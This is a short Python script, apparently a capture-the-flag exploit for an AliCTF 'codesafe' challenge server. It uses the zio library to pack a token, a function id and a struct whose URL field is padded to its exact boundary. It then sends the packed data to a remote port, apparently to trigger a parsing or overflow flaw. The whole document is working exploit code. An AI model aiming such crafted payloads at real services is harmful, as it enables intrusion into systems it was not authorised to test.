#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *
import time

ip = '115.29.191.81'
ip = 'codesafe300.alictf.com'
port = 30000

# UINT_SIZE = 4
# buf[0] = len_token
# buf[1->len_token] = token
# buf[len_token+1] = function_id
# buf[len_token+2->len_token+2+UINT_SIZE-1] = host_len_data(len_data)
# buf[len_token+2+UINT_SIZE->len_token+2+UINT_SIZE+host_len_data-1] = data

token = '603a072175332a3fbb37f5b43f6bcde6'
len_token = len(token)
function_id = 2

# struct stc
# {
#     int mn;
#     time_t ts;
#     int v;
#     char k[16];
#     unsigned int len;
#     char szUrl[256];
# };

mn = 0x4848
ts =  int(str(time.time())[0:10],10)
v = 2
k = 'sdatsts-afu'+'\x00'*5
url_len = 256
szUrl = 'http://alibaba.com/'
szUrl += 'x'*(256-3-len(szUrl)) + ':80'

len_data = 288
data = l32(mn) + l32(ts) + l32(v) + k + l32(url_len) + szUrl

buf = ""
buf += chr(len_token)
buf += token
buf += chr(function_id)
buf += b32(len_data)
buf += data

io = zio((ip, port), timeout = 1000, print_write = COLORED(REPR))
io.write(buf)
io.read()
